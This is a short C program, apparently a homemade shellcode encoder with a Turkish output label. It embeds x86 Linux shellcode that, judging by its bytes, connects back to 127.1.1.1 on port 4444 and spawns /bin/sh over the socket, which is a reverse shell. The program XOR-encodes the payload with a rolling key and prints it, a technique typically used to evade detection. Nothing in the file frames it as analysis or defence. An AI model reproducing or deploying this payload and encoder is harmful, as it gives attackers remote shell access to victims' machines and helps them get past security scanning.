#include <stdio.h>
#include <stdint.h>

#define INITIAL_KEY 0XAA

int main(void)
{
	unsigned char buff[] = "\x31\xc0\x31\xdb\x31\xd2\xb0\x66\xb3\x01\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc6\x31\xc0\xb0\x66\xb3\x03\x68\x7f\x01\x01\x01\x66\x68\x11\x5c\x66\x6a\x02\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\x31\xc0\xb0\x3f\x89\xf3\x31\xc9\xcd\x80\x31\xc0\xb0\x3f\x31\xc9\xb1\x01\xcd\x80\x31\xc0\xb0\x3f\x31\xc9\xb1\x02\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\xb0\x0b\x31\xc9\x31\xd2\x89\xe3\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80";

	size_t size = sizeof(buff)-1;
	unsigned char key = INITIAL_KEY;

	unsigned char encoded_bytes[size];
	char encoded_str[size * 5 + 1];
	int offset = 0;

	for(size_t i = 0; i<size; i++)
	{
		unsigned char byte_val = buff[i];
		unsigned char encoded_byte = byte_val ^ key;
		encoded_bytes[i] = encoded_byte;
		offset += sprintf(encoded_str + offset, "0x%02x,", encoded_byte);
		key = (key + byte_val) & 0xFF;
	}

	if(offset > 0)
	{
		encoded_str[offset-1]= '\0';
	}

	size_t size_bytes = sizeof(encoded_bytes) / sizeof(encoded_bytes[0]);
	printf("byte sayısı: %zu",size_bytes);
	printf("\n[+] Encoded Shellcode:\n");
	printf("%s\n", encoded_str);

	return 0;
}

















